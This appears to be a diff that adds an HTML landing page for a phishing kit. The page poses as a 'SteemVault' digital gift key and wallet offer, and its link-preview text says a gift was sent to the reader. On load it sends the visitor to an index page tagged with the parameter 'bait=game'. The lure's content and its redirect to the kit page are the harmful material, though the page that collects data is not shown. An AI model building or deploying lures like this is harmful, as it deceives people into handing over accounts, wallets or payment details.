@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SteemVault | Digital Game Key Gift</title>
+  <meta property="og:type" content="website" />
+  <meta property="og:title" content="🎮 SteemVault Gift: Digital Wallet & Game Key" />
+  <meta property="og:description" content="Someone sent you a redeemable SteemVault gift key. Tap to reveal and claim." />
+  <meta name="theme-color" content="#1b2838" />
+  <meta http-equiv="refresh" content="0; url=./index.html?bait=game" />
+</head>
+<body style="background:#0b0d12;color:#fff;font-family:sans-serif;display:flex;align-items:center;justify-content:center;height:100vh;margin:0;">
+  <p>Loading gift key...</p>
+  <script>
+    const p = new URLSearchParams(window.location.search);
+    if (!p.has('bait')) p.set('bait', 'game');
+    window.location.replace('./index.html?' + p.toString());
+  </script>
+</body>
+</html>
